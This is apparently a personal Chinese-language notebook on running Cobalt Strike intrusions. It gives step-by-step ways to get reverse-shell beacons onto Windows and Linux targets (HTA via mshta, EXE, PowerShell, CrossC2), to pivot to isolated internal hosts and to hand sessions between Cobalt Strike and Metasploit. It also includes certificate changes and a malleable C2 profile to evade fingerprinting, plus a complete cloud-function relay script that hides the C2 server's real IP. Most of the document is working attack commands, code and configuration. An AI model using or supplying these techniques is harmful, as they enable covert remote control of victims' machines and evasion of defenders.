[https://blog.csdn.net/limb0/article/details/103215755](https://blog.csdn.net/limb0/article/details/103215755)<br />[https://blog.csdn.net/qq_26091745/article/details/98097401](https://blog.csdn.net/qq_26091745/article/details/98097401)<br />EXE、powershell、vba是什么东西<br /> <br />inject 5732 x64  cs进程迁移<br /> <br />cs端口转发 把内网ip的3389转发到389<br />rportfwd 389 192.168.1.30 3389
<a name="aelqz"></a>
## 上线攻击
<a name="5O1L4"></a>
### Hta上线
第一步<br />Listen 添加反弹监听的payload<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380106824-f8e6648e-7de6-4c8d-9098-2dd9fec5b70b.png#align=left&display=inline&height=203&originHeight=405&originWidth=732&size=154796&status=done&style=none&width=366)<br />第二步<br />Packages处添加攻击模式<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380115928-934bf5a3-afc2-4c6b-b0cb-b317e6a05cdd.png#align=left&display=inline&height=150&originHeight=300&originWidth=518&size=87420&status=done&style=none&width=259)<br />攻击模式中有三种不同的执行方式<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380122798-2a18670c-1fa0-460d-90e6-71f656cc9e97.png#align=left&display=inline&height=133&originHeight=265&originWidth=477&size=55474&status=done&style=none&width=238.5)<br />当时是选了powershell，然后用HOST file注入生成的HTA<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380131721-ceb56bf2-a5ab-4029-a884-4567fcd88f79.png#align=left&display=inline&height=160&originHeight=320&originWidth=447&size=89837&status=done&style=none&width=223.5)<br />然后在靶机执行mshta http://得到反弹shell<br />右击选择interact进入命令框，命令框执行要shell+命令   例如 shell ipconfig<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380142607-f1efd41c-fd38-49ea-8e2d-8b7a01dee5c2.png#align=left&display=inline&height=213&originHeight=425&originWidth=888&size=90157&status=done&style=none&width=444)<br /> <br /> <br />**启动服务端—>在客户端连接服务端—>创建listener—>创建攻击载荷(attack→packages)—>投递载荷—>靶机下载执行—>靶机上线—>拿到shell**<br />** **
<a name="IyfD9"></a>
### **Exe上线**
![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380155020-59273df0-eb72-4797-a8ff-61623ecdd608.png#align=left&display=inline&height=192&originHeight=383&originWidth=711&size=153075&status=done&style=none&width=355.5)<br />这个十分简单，生成后上传到目标机器然后执行就ok，但是要做免杀<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380165639-df84dd63-5d01-411a-bfcb-a6514ecf10af.png#align=left&display=inline&height=195&originHeight=390&originWidth=619&size=143381&status=done&style=none&width=309.5)
<a name="JViFU"></a>
### Powershell上线
![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380178134-a62ec618-1969-497b-90ac-316d69a0a411.png#align=left&display=inline&height=186&originHeight=372&originWidth=717&size=153414&status=done&style=none&width=358.5)<br />直接点击生成后复制路径，然后在目标机器上运行就可以<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380187362-22bd2395-0f87-426e-b066-5b2eb36a550b.png#align=left&display=inline&height=213&originHeight=425&originWidth=630&size=144533&status=done&style=none&width=315)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380195655-e1338e94-d1e4-4768-96b0-e55b9a2a07fa.png#align=left&display=inline&height=129&originHeight=257&originWidth=575&size=75831&status=done&style=none&width=287.5)
<a name="LfPq3"></a>
### CrossC2上线linux主机
**旧版**:<br />**必须要HTTPS**<br />**而且cobaltstrike的keys文件要和genCrossC2同一个目录下**<br />**![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1622646920389-fc135f91-505c-4797-abdb-b1782090c255.png#align=left&display=inline&height=129&originHeight=172&originWidth=620&size=70720&status=done&style=none&width=465)**<br />windows/beacon_https/reverse_https 类型的beacon<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380210921-dae6f3ab-befd-4e6f-8ae9-8897db38e5cb.png#align=left&display=inline&height=174&originHeight=347&originWidth=583&size=71431&status=done&style=none&width=291.5)<br />Vps生成 ./genCrossC2.Linux监听的IP 监听的端口 null null Linux x64 test<br />发送到靶机执行 ./test （可能要赋予权限，也可能会有报错）

**新版本 (注意Linux不是linux)**<br />2.2 只支持4.1以上的CS<br />root@kali:~/CrossC2# ./genCrossC2.Linux ip 端口 .cobaltstrike.beacon_keys null Linux x64 usr<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615130945191-cf7b37bf-ab45-4c13-bb93-78688d4b2432.png#align=left&display=inline&height=186&originHeight=372&originWidth=767&size=59613&status=done&style=none&width=383.5)

<a name="xuJUR"></a>
### 内网目标机子不出网，也不解析DNS的情况上线CS(TCP beacon)

情况只适用于内网的机子，需要先捅下A机子上线cs，然后B机子不出网，但是A机子与B是同一局域网。

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615383404470-511a8e04-2af2-405a-b4fe-152b42e686ff.png#align=left&display=inline&height=415&originHeight=554&originWidth=479&size=17900&status=done&style=none&width=359)<br />目标机子的内网ip 192.168.201.161

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615383513676-bcf45cfc-eb46-4718-ba6f-3b287874ad52.png#align=left&display=inline&height=367&originHeight=489&originWidth=614&size=135166&status=done&style=none&width=461)<br />在目标机子点击了cs的正向连接马后，利用内网同一局域网会话的机子执行命令，cs成功上线<br />**beacon> connect 192.168.201.161 4444**<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615385172716-58101d7f-6d39-420a-95a5-6d03d6889d34.png#align=left&display=inline&height=166&originHeight=331&originWidth=979&size=16887&status=done&style=none&width=489.5)<br />**beacon>unlink [ip address] [session PID] 下线机子**
<a name="7EXj3"></a>
### 内网不出网机子上线cs之SMB
自己的csdn博客<br />[https://blog.csdn.net/weixin_41598660/article/details/109196489](https://blog.csdn.net/weixin_41598660/article/details/109196489)
<a name="I2PXc"></a>
## 派生shell
<a name="TluVc"></a>
### Cs派生msf shell 
Host和port都是msf的ip和端口<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380227329-bbbe2cf4-79a0-4f3e-8da6-8bc6c885f61f.png#align=left&display=inline&height=222&originHeight=445&originWidth=724&size=91617&status=done&style=none&width=362)<br /> <br />msf5 > use exploit/multi/handler<br />msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp<br />payload => windows/x64/meterpreter/reverse_tcp<br />msf5 exploit(multi/handler) > set lhost 0.0.0.0<br />lhost => 0.0.0.0<br />msf5 exploit(multi/handler) > set lport 4434<br />lport => 4434<br /> 
<a name="pRHZJ"></a>
### Msf派生cs shell
![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380251530-9b0324a3-1d4d-482f-be0e-a82a0436ba43.png#align=left&display=inline&height=214&originHeight=427&originWidth=722&size=86009&status=done&style=none&width=361)<br />msf启动如下<br />use exploit/windows/local/payload_inject <br />set payload windows/meterpreter/reverse_http<br />set lhost 192.168.10.144<br />set lport 5051<br />set session 1<br />exploit<br /> 
<a name="NgVls"></a>
## 异常解决
如果出现下面的报错，选择监听的时候选https作为反弹shell的监听就成功了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611380267024-2d508732-8850-487d-961e-e147456c6599.png#align=left&display=inline&height=176&originHeight=352&originWidth=1031&size=425185&status=done&style=none&width=515.5)

<a name="tsmfZ"></a>
## CS修改流量特征
使用linux系统中的curl命令，可以很直观的看到cobalt strike的证书特征，所以要修改他。<br />curl https://ip:端口 -k -v<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614867399698-c3b76d86-71b1-48a7-8cec-1ccc864f0441.png#align=left&display=inline&height=251&originHeight=335&originWidth=748&size=161601&status=done&style=none&width=561)<br />两条命令修改特征，先把原来的cobalt strike.store删除
```html
keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname "CN=qq.com, OU=, O=service, L=shenzhen, ST=shenzhen, C=CN"
```

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614872062705-915cbdfa-24d6-42e7-9f89-693ca60ccf93.png#align=left&display=inline&height=194&originHeight=259&originWidth=1185&size=26522&status=done&style=none&width=889)
```html
keytool -importkeystore -srckeystore cobaltstrike.store -destkeystore cobaltstrike.store -deststoretype pkcs12
```

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614872081402-cbdc4afe-95b9-44b0-8348-b2c66ec33b82.png#align=left&display=inline&height=58&originHeight=77&originWidth=1175&size=4958&status=done&style=none&width=881)<br />查看证书内容。<br />keytool -list -v -keystore ./cobaltstrike.store<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614872186877-60c8db06-cb31-4f81-b196-e08343e69883.png#align=left&display=inline&height=311&originHeight=622&originWidth=881&size=34468&status=done&style=none&width=440.5)<br />启动cs后 curl一下查看，已经没有了cobaltstrike的特征了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614872274938-11ff2eb7-b3e1-4856-947c-3afebcfdb247.png#align=left&display=inline&height=315&originHeight=420&originWidth=909&size=30997&status=done&style=none&width=682)

<a name="Gf2yX"></a>
## DNSbeacon上线

首先买一个域名，我是去狗爹上买的，因为可以不用备案，匿名注册。<br />然后还需要一个vps服务器。<br />NS记录要指向域名，A记录要指向vps服务器ip<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614947990878-a2e55583-251a-44a4-8711-e4cef3ea0236.png#align=left&display=inline&height=267&originHeight=534&originWidth=1322&size=29679&status=done&style=none&width=661)<br />cobalt strike启动，记录如下，填写NS记录指向的 vpn.域名，不用ns1。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614947895954-618d1fcc-52b4-44f7-ae5f-17e029d914e0.png#align=left&display=inline&height=387&originHeight=515&originWidth=445&size=62098&status=done&style=none&width=334)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614948292369-e16294d9-219a-4ad8-a77b-97d7d95663de.png#align=left&display=inline&height=172&originHeight=229&originWidth=1001&size=15301&status=done&style=none&width=751)<br />上线后执行如下两条命令，但是dnsbeacon上线十分缓慢。<br />checkin<br />mode dns-txt

<a name="r9qCT"></a>
### Linux systemd-resolve占用53端口的解决方法，
![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614946314084-5c79a69b-6e06-40a5-a29b-b0ab2270b377.png#align=left&display=inline&height=62&originHeight=124&originWidth=1003&size=10835&status=done&style=none&width=501.5)<br />1、先停用 systemd-resolved 服务<br />systemctl stop systemd-resolved

2、编辑 /etc/systemd/resolved.conf 文件<br />vi /etc/systemd/resolved.conf<br />换下面说明更改，然后按一下“esc”键，再输入“:wq”（不要输入引号），回车保存即可。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614947661113-18385bee-0b02-458e-964c-cbf0d6e370a2.png#align=left&display=inline&height=233&originHeight=310&originWidth=394&size=8019&status=done&style=none&width=296)<br />[Resolve]<br />DNS=8.8.8.8  #取消注释，增加dns<br />#FallbackDNS=<br />#Domains=<br />#LLMNR=no<br />#MulticastDNS=no<br />#DNSSEC=no<br />#Cache=yes<br />DNSStubListener=no  #取消注释，把yes改为no

3、最后运行下面命令即可。<br />ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf

<a name="kEV59"></a>
## CS隐藏C2
利用腾讯云云函数，隐藏CS真实ip，但是这个有点限制，每个月虽然可以免费的一百万次的请求和40万GB·s的资源请求，但是外网出流量无免费额度。所以要注意点使用。<br />这里的函数名称千万不要填写任何关于自己的信息，包括id啥的，因为wireshark抓流量会捕抓到<br /> ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615017717254-5d8d2bb7-a631-4881-b421-c7ef85b7f631.png#align=left&display=inline&height=626&originHeight=834&originWidth=1422&size=49942&status=done&style=none&width=1067)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615037758919-238c13a6-e25a-4c85-bc28-d05e328b19ca.png#align=left&display=inline&height=543&originHeight=723&originWidth=890&size=92534&status=done&style=none&width=668)<br />使用自定义创建，函数名称改其他随机数<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038001361-e5ed12fd-9b26-4c48-9cf6-bd8c1e0c2312.png#align=left&display=inline&height=408&originHeight=815&originWidth=1622&size=52177&status=done&style=none&width=811)<br />图标中的第二步需要贴如下代码，如果CS的listen是http上线的话，下的C2位置要http，如果是https的beacon就填https的<br />
```python
# coding: utf8
import json,requests,base64
def main_handler(event, context):
    response = {}
    path = None
    headers = None
    try:
        C2='http://服务器ip:80'
        if 'path' in event.keys():
            path=event['path']
        if 'headers' in event.keys():    
            headers=event['headers']
        if 'httpMethod' in event.keys() and event['httpMethod'] == 'GET' :
            resp=requests.get(C2+path,headers=headers,verify=False) 
        else:
            resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
            print(resp.headers)
            print(resp.content)
        response={
            "isBase64Encoded": True,
            "statusCode": resp.status_code,
            "headers": dict(resp.headers),
            "body": str(base64.b64encode(resp.content))[2:-1]
        }
    except Exception as e:
        print('error')
        print(e)
    finally:
        return response
```
代码复制后修改成CS上线的vps服务器ip，然后点击完成。<br />然后在函数服务处点击触发管理，创建触发器处，填入如下参数，然后点击提交。**注意触发版本是LATEST**

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038279429-2dd69fcb-b33b-47a7-96be-706ab92daa95.png#align=left&display=inline&height=381&originHeight=762&originWidth=1375&size=41138&status=done&style=none&width=687.5)<br />点击api服务名进行跳转

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038317739-7fe52a43-2940-4ac3-a849-a122f5312f0d.png#align=left&display=inline&height=360&originHeight=480&originWidth=798&size=19511&status=done&style=none&width=599)<br />修改路径为/之后继续点击完成。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038356402-8bbf3fcd-5cff-4c94-ab10-65087f883e9a.png#align=left&display=inline&height=588&originHeight=784&originWidth=959&size=43235&status=done&style=none&width=719)<br />看到是运行中，就没有什么问题了。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038625774-dbe3a78a-b0dd-4146-88f0-6742928d9f63.png#align=left&display=inline&height=213&originHeight=425&originWidth=1784&size=26240&status=done&style=none&width=892)<br />然后把如下profile文件，上传至服务器<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038728156-ac0ae04b-e25d-4a47-a463-21e0e152dbc7.png#align=left&display=inline&height=116&originHeight=232&originWidth=824&size=20673&status=done&style=none&width=412)
```
set sample_name "t";
set sleeptime "3000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/api/x";

    client {
        header "Accept" "*/*";
        metadata {
            base64;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nodejs";
        output {
            base64;
            print;
        }
    }
}
http-stager {  
    set uri_x86 "/vue.min.js";
    set uri_x64 "/bootstrap-2.min.js";
}
http-post {
    set uri "/api/y";
    client {
        header "Accept" "*/*";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}

```
然后直接启动就行了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038756185-b40869d6-9c1f-4178-97c2-6303601aebe8.png#align=left&display=inline&height=49&originHeight=49&originWidth=581&size=3530&status=done&style=none&width=581)<br />CS启动后，要选择画红框中的域名部署CS的listen，不要带http和端口，否则无法上线。

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615038957431-da82fac0-ab38-412e-89ea-65f15f796e3d.png#align=left&display=inline&height=301&originHeight=602&originWidth=1600&size=31520&status=done&style=none&width=800)<br />配置如下，**一定不要带协议和端口**<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615039065279-34a64f38-e92d-4641-b3b3-2560734f3ead.png#align=left&display=inline&height=415&originHeight=554&originWidth=479&size=29573&status=done&style=none&width=359)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1623424968995-f9a2b953-f3a5-4476-be87-f03588a74a66.png#align=left&display=inline&height=228&originHeight=228&originWidth=397&size=26067&status=done&style=none&width=397)

上线后会自动变换ip<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615039365791-93e78c9f-b066-4140-ac79-dc523796c95e.png#align=left&display=inline&height=45&originHeight=90&originWidth=765&size=4046&status=done&style=none&width=382.5)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615039373119-d255713b-09be-482f-815a-fbcb8f3e4c66.png#align=left&display=inline&height=26&originHeight=51&originWidth=750&size=2835&status=done&style=none&width=375)

